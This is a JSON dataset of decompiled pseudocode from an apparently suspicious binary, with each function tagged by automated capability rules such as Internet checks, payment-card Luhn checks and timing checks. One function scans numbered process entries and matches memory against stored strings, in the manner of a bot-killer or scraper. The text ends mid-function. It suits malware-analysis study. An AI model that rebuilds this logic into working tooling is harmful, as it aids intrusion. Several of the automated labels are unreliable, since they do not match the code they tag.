{
    "00400100": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00400136)\n\nvoid fcn.00400100(void)\n\n{\n    code *pcVar1;\n    \n    // [02] -r-x section size 49414 named .text\n    if (*0x50f480 == '\\0') {\n        while (pcVar1 = **0x50f048,  pcVar1 != NULL) {\n            *0x50f048 = *0x50f048 + 1;\n            (*pcVar1)();\n        }\n        *0x50f480 = '\\x01';\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "null": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00400410": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00400410(uint32_t *arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    uint64_t uVar5;\n    ushort *arg4;\n    int64_t iVar6;\n    int64_t *piVar7;\n    ushort *puVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint32_t uVar11;\n    int64_t *piVar12;\n    uint32_t uVar13;\n    uint64_t uVar14;\n    uint *puVar15;\n    uint8_t *puVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    uint32_t uVar19;\n    uchar auVar20 [16];\n    uint8_t uStack81;\n    int64_t *piStack80;\n    uint32_t uStack68;\n    int64_t *piStack64;\n    \n    if (arg2 < 4) {\n        return;\n    }\n    uVar13 = *arg1;\n    if (arg2 == 4) {\n        return;\n    }\n    uVar2 = *(arg1 + 1);\n    if (arg2 == 5) {\n        return;\n    }\n    uVar3 = *(arg1 + 5);\n    if (uVar3 == 0) {\n        return;\n    }\n    iVar18 = arg2 - 6;\n    if (iVar18 < uVar3 * 5) {\n        return;\n    }\n    puVar15 = arg1 + 6;\n    arg4 = fcn.00409190(uVar3, 0x18);\n    uVar17 = uVar3;\n    if (uVar3 != 0) {\n        puVar8 = arg4;\n        do {\n            uVar4 = *puVar15;\n            *(puVar8 + 8) = uVar4;\n            uVar3 = *(puVar15 + 1);\n            puVar15 = puVar15 + 5;\n            *puVar8 = 2;\n            *(puVar8 + 2) = uVar4;\n            *(puVar8 + 10) = uVar3;\n            puVar8 = puVar8 + 0xc;\n        } while (arg1 + (uVar17 - 1) * 5 + 0xb != puVar15);\n        iVar18 = arg2 + uVar17 * -5 + -6;\n    }\n    piStack80 = NULL;\n    if (iVar18 == 0) goto code_r0x00400638;\n    uStack81 = *puVar15;\n    uStack68 = 0;\n    if (uStack81 == 0) {\ncode_r0x0040060d:\n        puVar15 = fcn.00406f98();\n        *puVar15 = 0;\n        fcn.004001c0(uVar13 >> 0x18 | (uVar13 & 0xff0000) >> 8 | (uVar13 & 0xff00) << 8 | uVar13 << 0x18, uVar2, uVar17\n                     , arg4, uStack68, piStack80);\n    }\n    else {\n        piStack80 = fcn.00409190(uStack81, 0x10);\n        uStack68 = uStack81;\n        if (uStack81 == 0) goto code_r0x0040060d;\n        if ((iVar18 != 1) && (*(piStack80 + 1) = *(puVar15 + 1),  iVar18 != 2)) {\n            uVar3 = *(puVar15 + 2);\n            iVar18 = iVar18 + -3;\n            if (uVar3 <= iVar18) {\n                puVar16 = puVar15 + 3;\n                uVar19 = 0;\n                piVar12 = piStack80;\n                while( true ) {\n                    piStack64 = piVar12 + 2;\n                    uVar11 = uVar3;\n                    uVar19 = uVar19 + 1;\n                    iVar6 = fcn.00409190(uVar11 + 1, 1);\n                    *piVar12 = iVar6;\n                    fcn.00405d90(iVar6, puVar16, uVar11);\n                    if (uVar19 == uStack68) break;\n                    iVar18 = iVar18 - uVar11;\n                    if (iVar18 == 0) goto code_r0x00400638;\n                    puVar16 = puVar16 + uVar3;\n                    *(piVar12 + 3) = *puVar16;\n                    if (iVar18 == 1) goto code_r0x00400638;\n                    uVar3 = puVar16[1];\n                    iVar18 = iVar18 + -2;\n                    if (iVar18 < uVar3) goto code_r0x00400638;\n                    puVar16 = puVar16 + 2;\n                    piVar12 = piStack64;\n                }\n                goto code_r0x0040060d;\n            }\n        }\n    }\ncode_r0x00400638:\n    if (arg4 != NULL) {\n        fcn.00409817(arg4);\n    }\n    if (piStack80 == NULL) {\n        return;\n    }\n    if (uStack81 != 0) {\n        uVar13 = 0;\n        piVar12 = piStack80;\n        do {\n            if (*piVar12 != 0) {\n                fcn.00409817(*piVar12);\n            }\n            uVar13 = uVar13 + 1;\n            piVar12 = piVar12 + 2;\n        } while (uStack81 != uVar13);\n    }\n    if (piStack80 == NULL) {\n        return;\n    }\n    fcn.0040a6b1(&stack0xffffffffffffffd8, fcn.0040a6ae, 0x50f2c0);\n    fcn.0040a6ae(0x50f2c0);\n    uVar5 = piStack80[-1];\n    piVar12 = piStack80 + -2;\n    uVar10 = uVar5 & 0xfffffffffffffffc;\n    if (uVar10 <= *0x511880) {\n        *0x511880 = *0x511880 | 3;\n        iVar6 = (((uVar5 & 0xfffffffc) >> 3) - 2) * 8;\n        *piStack80 = *(iVar6 + 0x511888);\n        *(iVar6 + 0x511888) = piVar12;\n        goto code_r0x004099c8;\n    }\n    if ((uVar5 & 2) != 0) {\n        *0x511f18 = *0x511f18 + -1;\n        *0x511f30 = *0x511f30 - (uVar10 + piStack80[-2]);\n        fcn.0040ad94(piVar12 - piStack80[-2]);\n        goto code_r0x004099c8;\n    }\n    *0x511880 = *0x511880 | 1;\n    piVar1 = piVar12 + uVar10;\n    uVar5 = piVar1[1];\n    if ((*(piStack80 + -1) & 1) == 0) {\n        uVar14 = piStack80[-2];\n        piVar7 = piVar12 - uVar14;\n        iVar6 = piVar7[2];\n        iVar9 = piVar7[3];\n        piVar12 = *(iVar6 + 0x18);\n        if ((piVar12 == piVar7) && (*(iVar9 + 0x10) == piVar12)) {\n            uVar10 = uVar10 + uVar14;\n            *(iVar6 + 0x18) = iVar9;\n            *(iVar9 + 0x10) = iVar6;\n            goto code_r0x004098d9;\n        }\ncode_r0x00409910:\n        auVar20 = fcn.004099f8();\ncode_r0x00409915:\n        *(iVar9 + 0x18) = SUB168(auVar20, 0);\n        *(SUB168(auVar20, 0) + 0x10) = iVar9;\n        uVar10 = SUB168(auVar20 >> 0x40, 0) + uVar14;\ncode_r0x00409920:\n        piVar12[3] = 0x5118f0;\n        *(piVar12 + uVar10) = uVar10;\n        piVar12[2] = *0x511900;\n        (*0x511900)[3] = piVar12;\n        *0x511900 = piVar12;\n        piVar12[1] = uVar10 | 1;\n    }\n    else {\ncode_r0x004098d9:\n        uVar14 = uVar5 & 0xfffffffffffffffc;\n        if (piVar1 != *0x5118e0) {\n            uVar13 = *(piVar1 + uVar14 + 8);\n            piVar1[1] = uVar14;\n            if ((uVar13 & 1) == 0) {\n                iVar9 = piVar1[2];\n                auVar20 = CONCAT88(uVar10, piVar1[3]);\n                if ((*(iVar9 + 0x18) != piVar1) || (*(piVar1[3] + 0x10) != *(iVar9 + 0x18))) goto code_r0x00409910;\n                goto code_r0x00409915;\n            }\n            goto code_r0x00409920;\n        }\n        uVar10 = uVar10 + uVar14;\n        piVar12[1] = uVar10 | 1;\n        *0x5118e0 = piVar12;\n    }\n    if (0x1ffff < uVar10) {\n        if ((*0x511880 & 2) != 0) {\n            fcn.0040967d(0x511880);\n        }\n        if (*0x511f00 <= ((*0x5118e0)[1] & 0xfffffffffffffffcU)) {\n            fcn.004095e4(*0x511f08, 0x511880);\n        }\n    }\ncode_r0x004099c8:\n    fcn.0040a6b1(&stack0xffffffffffffffd8, 1);\n    return;\n}\n",
        "token_count": 2306
    },
    "004006f0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.004006f0(ulong noname_0, char **arg2, ulong noname_2, uint64_t arg4)\n\n{\n    char cVar1;\n    bool bVar2;\n    bool bVar3;\n    char **ppcVar4;\n    uint64_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    char *pcVar8;\n    ulong uVar9;\n    uint32_t uVar10;\n    uint64_t uVar11;\n    \n    if (noname_0 != 0) {\n        if (noname_2 != *(arg2 + 1)) {\n            uVar10 = 0;\n            ppcVar4 = arg2 + 2;\n            do {\n                arg2 = ppcVar4;\n                uVar10 = uVar10 + 1;\n                if (noname_0 == uVar10) goto code_r0x0040071e;\n                ppcVar4 = arg2 + 2;\n            } while (noname_2 != *(arg2 + 1));\n        }\n        pcVar8 = *arg2;\n        if (*arg2 != NULL) {\n            do {\n                do {\n                    pcVar7 = pcVar8;\n                    cVar1 = *pcVar7;\n                    pcVar8 = pcVar7 + 1;\n                } while (cVar1 == ' ' || cVar1 == '\\t');\n            } while (cVar1 == '\\n');\n            if (cVar1 == '-') {\n                cVar1 = *pcVar8;\n                uVar5 = 0x8000000000000000;\n                pcVar8 = pcVar7 + 2;\n                bVar3 = true;\n            }\n            else {\n                if (cVar1 == '+') {\n                    cVar1 = *pcVar8;\n                    pcVar8 = pcVar7 + 2;\n                }\n                uVar5 = 0x7fffffffffffffff;\n                bVar3 = false;\n            }\n            uVar11 = 0;\n            uVar9 = 0;\n            do {\n                iVar6 = cVar1 + -0x30;\n                if (9 < cVar1 - 0x30U) {\n                    bVar2 = 0x19 < cVar1 + 0xbfU;\n                    if (0x19 < cVar1 + 0x9fU && bVar2) {\ncode_r0x004060e1:\n                        if (uVar9 < 0) {\n                            return -!bVar3;\n                        }\n                        uVar5 = -uVar11;\n                        if (!bVar3) {\n                            uVar5 = uVar11 & 0xffffffff;\n                        }\n                        return uVar5;\n                    }\n                    iVar6 = cVar1 - ((-bVar2 & 0x20) + 0x37);\n                }\n                if (9 < iVar6) goto code_r0x004060e1;\n                if (((uVar5 / 10 < uVar11 | (uVar9 >> 0x18) >> 7) == 0) &&\n                   (iVar6 <= SUB164(ZEXT816(uVar5) % ZEXT816(10), 0) || uVar11 != uVar5 / 10)) {\n                    uVar9 = 1;\n                    uVar11 = uVar11 * 10 + iVar6;\n                }\n                else {\n                    uVar9 = 0xffffffff;\n                }\n                cVar1 = *pcVar8;\n                pcVar8 = pcVar8 + 1;\n            } while( true );\n        }\n    }\ncode_r0x0040071e:\n    return arg4 & 0xffffffff;\n}\n",
        "token_count": 801
    },
    "004032f0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004032f0(uint16_t *arg1, ulong arg2)\n\n{\n    uint16_t uVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    \n    uVar3 = 0;\n    if (1 < arg2) {\n        do {\n            uVar1 = *arg1;\n            arg2._0_4_ = arg2 - 2;\n            arg1 = arg1 + 1;\n            uVar3 = uVar3 + uVar1;\n        } while (1 < arg2);\n    }\n    if (arg2 == 1) {\n        uVar3 = uVar3 + *arg1;\n    }\n    iVar2 = (uVar3 >> 0x10) + (uVar3 & 0xffff);\n    return ~(iVar2 + (iVar2 >> 0x10)) & 0xffff;\n}\n",
        "token_count": 195
    },
    "00403340": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00403340(int64_t arg1, uint16_t *arg2, ulong arg3, ulong arg4)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (1 < arg4) {\n        do {\n            uVar1 = *arg2;\n            arg4._0_4_ = arg4 + -2;\n            arg2 = arg2 + 1;\n            iVar3 = iVar3 + uVar1;\n        } while (1 < arg4);\n    }\n    if (arg4 == 1) {\n        iVar3 = iVar3 + *arg2;\n    }\n    for (uVar2 = iVar3 + (*(arg1 + 0x10) >> 0x10) + *(arg1 + 9) * 0x100 +\n                 (*(arg1 + 0xc) >> 0x10) + (*(arg1 + 0xc) & 0xffff) + (*(arg1 + 0x10) & 0xffff) + (arg3 & 0xffff);\n        uVar2 >> 0x10 != 0; uVar2 = (uVar2 & 0xffff) + (uVar2 >> 0x10)) {\n    }\n    return ~uVar2 & 0xffff;\n}\n",
        "token_count": 298
    },
    "004033c0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nchar * fcn.004033c0(ulong arg1)\n\n{\n    int64_t iVar1;\n    uchar *puVar2;\n    char *pcVar3;\n    char *arg1_00;\n    int64_t unaff_RBP;\n    \n    iVar1 = fcn.00408494(arg1, \"GET /\");\n    if (iVar1 != 0) {\n        unaff_RBP = iVar1 + 5;\n    }\n    iVar1 = fcn.00408494(arg1, \"HEAD /\");\n    if (iVar1 != 0) {\n        unaff_RBP = iVar1 + 6;\n    }\n    iVar1 = fcn.00408494(arg1, \"POST /\");\n    if (iVar1 != 0) {\n        unaff_RBP = iVar1 + 6;\n    }\n    if (unaff_RBP == 0) {\n        unaff_RBP = *0x511560;\n    }\n    iVar1 = fcn.0040c088(unaff_RBP, 0x40cd2d);\n    arg1_00 = unaff_RBP + iVar1;\n    if (*arg1_00 == '\\0') {\n        pcVar3 = NULL;\n        *0x511560 = arg1_00;\n    }\n    else {\n        puVar2 = fcn.0040bff8(arg1_00, 0x40cd2d);\n        pcVar3 = arg1_00;\n        if (puVar2 == NULL) {\n            *0x511560 = fcn.0040c110(arg1_00);\n        }\n        else {\n            *puVar2 = 0;\n            *0x511560 = puVar2 + 1;\n        }\n    }\n    return pcVar3;\n}\n",
        "token_count": 381
    },
    "00403870": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00403870(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    ulong uVar7;\n    int64_t arg1;\n    int64_t iVar8;\n    ulong arg3;\n    char *pcVar9;\n    int32_t iVar10;\n    uint32_t uStack4224;\n    char acStack4216 [4096];\n    uchar auStack120 [72];\n    \n    iVar2 = fcn.00406bf4(0);\n    *0x50f054 = fcn.00406950();\n    if (*0x50f054 < 1 && *0x50f054 != -1) {\n        fcn.0040a334(5);\n        uVar6 = 400;\n        uStack4224 = 0;\n        while( true ) {\n            fcn.004061e0(3);\n            uVar7 = fcn.00406140(3, 0);\n            arg1 = fcn.00406e14(uVar7);\n            if (arg1 == 0) break;\n            fcn.00406170(3);\n            while (iVar8 = fcn.00406f08(arg1),  iVar8 != 0) {\n                if (*(iVar8 + 0x13) - 0x30U < 10) {\n                    uVar3 = fcn.0040a02c(iVar8 + 0x13);\n                    uStack4224 = uStack4224 + 1;\n                    if (uVar6 < uVar3) {\n                        iVar2 = fcn.00406bf4(0);\n                        fcn.004061e0(3);\n                        fcn.004061e0(6);\n                        uVar7 = fcn.00406140(3, 0);\n                        iVar4 = fcn.00405d50(auStack120, uVar7);\n                        iVar5 = fcn.00405d50(auStack120 + iVar4, iVar8 + 0x13);\n                        uVar7 = fcn.00406140(6, 0);\n                        fcn.00405d50(auStack120 + iVar4 + iVar5, uVar7);\n                        fcn.00406170(3);\n                        fcn.00406170(6);\n                        uVar6 = fcn.00406978();\n                        if (((uVar3 != uVar6) && (uVar6 = fcn.004069a0(),  uVar3 != uVar6)) &&\n                           (iVar4 = fcn.00406978(),  uVar3 != iVar4 + 1U)) {\n                            uVar6 = fcn.00406a5c(auStack120, 0, arg3);\n                            if (uVar6 != 0xffffffff) {\n                                fcn.004061e0(0x15);\n                                fcn.004061e0(0x16);\n                                fcn.004061e0(0x17);\n                                fcn.004061e0(0x18);\n                                fcn.004061e0(0x19);\n                                fcn.004061e0(0x20);\n                                fcn.004061e0(0x1a);\n                                fcn.004061e0(0x1b);\n                                fcn.004061e0(0x1c);\n                                fcn.004061e0(0x1d);\n                                fcn.004061e0(0x1e);\n                                fcn.004061e0(0x1f);\n                                fcn.004061e0(0x22);\n                                fcn.004061e0();\n                                bVar1 = false;\ncode_r0x00403abf:\n                                iVar4 = fcn.00406b00(uVar6);\n                                if (0 < iVar4) {\n                                    uVar7 = fcn.00406140(0x15, 0);\n                                    iVar5 = fcn.00405cf0(uVar7);\n                                    iVar8 = fcn.00406140(0x15, 0);\n                                    iVar4 = fcn.00405cf0(acStack4216);\n                                    iVar10 = 0;\n                                    pcVar9 = acStack4216;\n                                    if (iVar5 <= iVar4) {\n                                        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n                                            if (*pcVar9 == *(iVar8 + iVar10)) {\n                                                iVar10 = iVar10 + 1;\n                                                if (iVar5 == iVar10) goto code_r0x00403b35;\n                                            }\n                                            else {\n                                                iVar10 = 0;\n                                            }\n                                            pcVar9 = pcVar9 + 1;\n                                        }\n                                    }\n                                    uVar7 = fcn.00406140(0x16, 0);\n                                    iVar5 = fcn.00405cf0(uVar7);\n                                    iVar8 = fcn.00406140(0x16, 0);\n                                    iVar4 = fcn.00405cf0(acStack4216);\n                                    iVar10 = 0;\n                                    pcVar9 = acStack4216;\n                                    if (iVar5 <= iVar4) {\n                                        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n                                            if (*pcVar9 == *(iVar8 + iVar10)) {\n                                                iVar10 = iVar10 + 1;\n                                                if (iVar5 == iVar10) goto code_r0x00403b35;\n                                            }\n                                            else {\n                                                iVar10 = 0;\n                                            }\n                                            pcVar9 = pcVar9 + 1;\n                                        }\n                                    }\n                                    uVar7 = fcn.00406140(0x17, 0);\n                                    iVar5 = fcn.00405cf0(uVar7);\n                                    iVar8 = fcn.00406140(0x17, 0);\n                                    iVar4 = fcn.00405cf0(acStack4216);\n                                    iVar10 = 0;\n                                    pcVar9 = acStack4216;\n                                    if (iVar5 <= iVar4) {\n                                        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n                                            if (*pcVar9 == *(iVar8 + iVar10)) {\n                                                iVar10 = iVar10 + 1;\n                                                if (iVar5 == iVar10) goto code_r0x00403b35;\n                                            }\n                                            else {\n                                                iVar10 = 0;\n                                            }\n                                            pcVar9 = pcVar9 + 1;\n                                        }\n                                    }\n                                    uVar7 = fcn.00406140(0x20, 0);\n                                    iVar5 = fcn.00405cf0(uVar7);\n                                    iVar8 = fcn.00406140(0x20, 0);\n                                    iVar4 = fcn.00405cf0(acStack4216);\n                                    iVar10 = 0;\n                                    pcVar9 = acStack4216;\n                                    if (iVar5 <= iVar4) {\n                                        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n                                            if (*pcVar9 == *(iVar8 + iVar10)) {\n                                                iVar10 = iVar10 + 1;\n                                                if (iVar5 == iVar10) goto code_r0x00403b35;\n                                            }\n                                            else {\n                                                iVar10 = 0;\n                                            }\n                                            pcVar9 = pcVar9 + 1;\n                                        }\n                                    }\n                                    goto code_r0x00403b3a;\n                                }\n                                fcn.00406924(uVar6);\n                                fcn.00406170(0x15);\n                                fcn.00406170(0x16);\n                                fcn.00406170(0x17);\n                                fcn.00406170(0x18);\n                                fcn.00406170(0x19);\n                                fcn.00406170(0x20);\n                                fcn.00406170(0x1a);\n                                fcn.00406170(0x1b);\n                                fcn.00406170(0x1c);\n                                fcn.00406170(0x1d);\n                                fcn.00406170(0x1e);\n                                fcn.00406170(0x1f);\n                                fcn.00406170(0x22);\n                                fcn.00406170();\n                                if (bVar1) {\n                                    fcn.00406a30(uVar3, 9);\n                                }\n                            }\n                        }\n                        fcn.00405db0(auStack120, 0x40);\n                        uVar6 = uVar3;\n                    }\n                    else {\n                        iVar8 = fcn.00406bf4(0);\n                        if (iVar8 - iVar2 < 0x79) {\n                            if ((400 < uVar3) && (uStack4224 == (uStack4224 / 10) * 10)) {\n                                fcn.0040a334(1);\n                            }\n                        }\n                        else {\n                            uVar6 = 400;\n                        }\n                    }\n                }\n            }\n            fcn.00406da0(arg1);\n        }\n    }\n    return;\ncode_r0x00403b35:\n    bVar1 = true;\ncode_r0x00403b3a:\n    uVar7 = fcn.00406140(0x18, 0);\n    iVar5 = fcn.00405cf0(uVar7);\n    iVar8 = fcn.00406140(0x18, 0);\n    iVar4 = fcn.00405cf0(acStack4216);\n    iVar10 = 0;\n    pcVar9 = acStack4216;\n    if (iVar5 <= iVar4) {\n        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n            if (*pcVar9 == *(iVar8 + iVar10)) {\n                iVar10 = iVar10 + 1;\n                if (iVar5 == iVar10) {\n                    uVar7 = fcn.00406140(0x19, 0);\n                    iVar5 = fcn.00405cf0(uVar7);\n                    iVar8 = fcn.00406140(0x19, 0);\n                    iVar4 = fcn.00405cf0(acStack4216);\n                    iVar10 = 0;\n                    pcVar9 = acStack4216;\n                    if (iVar5 <= iVar4) goto code_r0x00403ca5;\n                    break;\n                }\n            }\n            else {\n                iVar10 = 0;\n            }\n            pcVar9 = pcVar9 + 1;\n        }\n    }\ncode_r0x00403b76:\n    uVar7 = fcn.00406140(0x1a, 0);\n    iVar5 = fcn.00405cf0(uVar7);\n    iVar8 = fcn.00406140(0x1a, 0);\n    iVar4 = fcn.00405cf0(acStack4216);\n    iVar10 = 0;\n    pcVar9 = acStack4216;\n    if (iVar5 <= iVar4) {\n        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n            if (*pcVar9 == *(iVar8 + iVar10)) {\n                iVar10 = iVar10 + 1;\n                if (iVar5 == iVar10) goto code_r0x00403bd4;\n            }\n            else {\n                iVar10 = 0;\n            }\n            pcVar9 = pcVar9 + 1;\n        }\n    }\n    uVar7 = fcn.00406140(0x1b, 0);\n    iVar5 = fcn.00405cf0(uVar7);\n    iVar8 = fcn.00406140(0x1b, 0);\n    iVar4 = fcn.00405cf0(acStack4216);\n    iVar10 = 0;\n    pcVar9 = acStack4216;\n    if (iVar5 <= iVar4) {\n        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n            if (*pcVar9 == *(iVar8 + iVar10)) {\n                iVar10 = iVar10 + 1;\n                if (iVar5 == iVar10) goto code_r0x00403bd4;\n            }\n            else {\n                iVar10 = 0;\n            }\n            pcVar9 = pcVar9 + 1;\n        }\n    }\n    uVar7 = fcn.00406140(0x1c, 0);\n    iVar5 = fcn.00405cf0(uVar7);\n    iVar8 = fcn.00406140(0x1c, 0);\n    iVar4 = fcn.00405cf0(acStack4216);\n    iVar10 = 0;\n    pcVar9 = acStack4216;\n    if (iVar5 <= iVar4) {\n        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n            if (*pcVar9 == *(iVar8 + iVar10)) {\n                iVar10 = iVar10 + 1;\n                if (iVar5 == iVar10) goto code_r0x00403bd4;\n            }\n            else {\n                iVar10 = 0;\n            }\n            pcVar9 = pcVar9 + 1;\n        }\n    }\n    uVar7 = fcn.00406140(0x22, 0);\n    iVar5 = fcn.00405cf0(uVar7);\n    iVar8 = fcn.00406140(0x22, 0);\n    iVar4 = fcn.00405cf0(acStack4216);\n    iVar10 = 0;\n    pcVar9 = acStack4216;\n    if (iVar5 <= iVar4) {\n        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n            if (*pcVar9 == *(iVar8 + iVar10)) {\n                iVar10 = iVar10 + 1;\n                if (iVar5 == iVar10) goto code_r0x00403bd4;\n            }\n            else {\n                iVar10 = 0;\n            }\n            pcVar9 = pcVar9 + 1;\n        }\n    }\n    uVar7 = fcn.00406140(0x23, 0);\n    iVar5 = fcn.00405cf0(uVar7);\n    iVar8 = fcn.00406140(0x23, 0);\n    iVar4 = fcn.00405cf0(acStack4216);\n    iVar10 = 0;\n    pcVar9 = acStack4216;\n    if (iVar5 <= iVar4) {\n        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n            if (*pcVar9 == *(iVar8 + iVar10)) {\n                iVar10 = iVar10 + 1;\n                if (iVar5 == iVar10) goto code_r0x00403bd4;\n            }\n            else {\n                iVar10 = 0;\n            }\n            pcVar9 = pcVar9 + 1;\n        }\n    }\n    uVar7 = fcn.00406140(0x1d, 0);\n    iVar5 = fcn.00405cf0(uVar7);\n    iVar8 = fcn.00406140(0x1d, 0);\n    iVar4 = fcn.00405cf0(acStack4216);\n    iVar10 = 0;\n    pcVar9 = acStack4216;\n    if (iVar5 <= iVar4) {\n        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n            if (*pcVar9 == *(iVar8 + iVar10)) {\n                iVar10 = iVar10 + 1;\n                if (iVar5 == iVar10) goto code_r0x00403bd4;\n            }\n            else {\n                iVar10 = 0;\n            }\n            pcVar9 = pcVar9 + 1;\n        }\n    }\ncode_r0x00403bd9:\n    uVar7 = fcn.00406140(0x1e, 0);\n    iVar5 = fcn.00405cf0(uVar7);\n    iVar8 = fcn.00406140(0x1e, 0);\n    iVar4 = fcn.00405cf0(acStack4216);\n    iVar10 = 0;\n    pcVar9 = acStack4216;\n    if (iVar5 <= iVar4) {\n        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n            if (*pcVar9 == *(iVar8 + iVar10)) {\n                iVar10 = iVar10 + 1;\n                if (iVar5 == iVar10) goto code_r0x00403abf;\n            }\n            else {\n                iVar10 = 0;\n            }\n            pcVar9 = pcVar9 + 1;\n        }\n    }\n    uVar7 = fcn.00406140(0x1f, 0);\n    iVar5 = fcn.00405cf0(uVar7);\n    iVar8 = fcn.00406140(0x1f, 0);\n    iVar4 = fcn.00405cf0(acStack4216);\n    iVar10 = 0;\n    pcVar9 = acStack4216;\n    if (iVar5 <= iVar4) {\n        while (iVar4 = iVar4 + -1,  iVar4 != -1) {\n            if (*pcVar9 == *(iVar8 + iVar10)) {\n                iVar10 = iVar10 + 1;\n                if (iVar5 == iVar10) goto code_r0x00403abf;\n            }\n            else {\n                iVar10 = 0;\n            }\n            pcVar9 = pcVar9 + 1;\n        }\n    }\n    for (iVar4 = 0; iVar5 = fcn.00405cf0(acStack4216),  iVar4 < iVar5; iVar4 = iVar4 + 1) {\n    }\n    goto code_r0x00403abf;\ncode_r0x00403ca5:\n    iVar4 = iVar4 + -1;\n    if (iVar4 == -1) goto code_r0x00403b76;\n    if (*pcVar9 == *(iVar8 + iVar10)) {\n        iVar10 = iVar10 + 1;\n        if (iVar5 == iVar10) goto code_r0x00403bd4;\n    }\n    else {\n        iVar10 = 0;\n    }\n    pcVar9 = pcVar9 + 1;\n    goto code_r0x00403ca5;\ncode_r0x00403bd4:\n    bVar1 = true;\n    goto code_r0x00403bd9;\n}\n",
        "token_count": 4038
    },
    "004047d0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.004047d0(void)\n\n{\n    int64_t iVar1;\n    char *pcVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint64_t uVar8;\n    ulong arg4;\n    ulong noname_2;\n    ulong extraout_RDX;\n    ulong extraout_RDX_00;\n    ulong noname_2_00;\n    ulong extraout_RDX_01;\n    int64_t iVar9;\n    int32_t iVar10;\n    ulong *puVar11;\n    ulong in_R9;\n    uchar auVar12 [16];\n    char cStack1712;\n    char cStack1711;\n    char cStack1710;\n    uint64_t auStack688 [4];\n    ulong uStack656;\n    ulong uStack648;\n    ulong uStack640;\n    ulong uStack632;\n    ulong uStack624;\n    ulong uStack616;\n    ulong uStack608;\n    ulong uStack600;\n    ulong uStack592;\n    ulong uStack584;\n    ulong uStack576;\n    ulong uStack568;\n    uint64_t auStack560 [4];\n    ulong uStack528;\n    ulong uStack520;\n    ulong uStack512;\n    ulong uStack504;\n    ulong uStack496;\n    ulong uStack488;\n    ulong uStack480;\n    ulong uStack472;\n    ulong uStack464;\n    ulong uStack456;\n    ulong uStack448;\n    ulong uStack440;\n    uchar auStack432 [112];\n    uchar auStack320 [3];\n    uchar uStack317;\n    uchar auStack316 [60];\n    char *apcStack256 [4];\n    char *apcStack224 [4];\n    char *apcStack192 [4];\n    uchar auStack160 [32];\n    ulong uStack128;\n    ulong uStack120;\n    uint uStack96;\n    uchar auStack92 [4];\n    int32_t iStack88;\n    uint16_t auStack82 [5];\n    uint64_t uStack72;\n    uint uStack12;\n    \n    *0x50f510 = fcn.00406950();\n    uVar4 = *0x50f510 + 1;\n    